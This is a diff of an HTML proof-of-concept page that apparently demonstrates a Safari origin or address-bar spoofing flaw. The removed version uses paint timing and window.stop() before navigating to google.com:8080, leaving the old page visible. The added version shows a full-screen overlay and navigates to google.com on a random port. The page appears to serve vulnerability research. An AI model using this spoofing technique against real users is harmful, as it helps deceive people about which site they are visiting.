@@ -1,62 +1,40 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Safari Transient Origin PoC</title>
+<meta charset="utf-8">
+<title>PoC Random Port Navigation</title>
 <style>
-html, body {
-  margin: 0;
-  padding: 0;
-  height: 100%;
-  background: #b00000;
-  color: white;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  font-family: -apple-system, sans-serif;
-  font-size: 48px;
-  text-align: center;
-}
-#origin {
-  position: fixed;
-  bottom: 10px;
-  font-size: 14px;
-}
+  body { margin: 0; font-family: system-ui; }
+  .spoof {
+    position: fixed;
+    inset: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 32px;
+    background: white;
+    z-index: 9999;
+  }
 </style>
 </head>
-
 <body>
-<div>
-  NOT GOOGLE<br>
-  Origin Confusion Demo
-</div>
-<div id="origin">Origin: ecdnts-del.github.io</div>
+
+<div class="spoof">Origin A – github.io</div>
+
+<button id="go">Navigate</button>
 
 <script>
-function strongPoC() {
+document.getElementById('go').addEventListener('click', function() {
+    // sinkron, user-initiated
+    let randomPort;
+    do {
+        randomPort = Math.floor(Math.random() * 1000);
+    } while (randomPort === 0 || randomPort === 443);
 
-  // PHASE 1 — tunggu browser selesai paint (penting di Safari)
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-
-      // PHASE 2 — beri delay kecil supaya teks benar-benar terlihat
-      setTimeout(() => {
-
-        // hentikan loading (Safari tetap render halaman lama)
-        window.stop();
-
-        // PHASE 3 — commit top-level navigation
-        location.href = "https://google.com:8080";
-
-        console.log("Navigation committed, old content still rendered");
-
-      }, 300); // sweet spot Safari (200–400ms)
-
-    });
-  });
-}
-
-strongPoC();
+    // navigasi top-level langsung
+    location.href = "https://google.com:" + randomPort + "/";
+});
 </script>
+
 </body>
 </html>
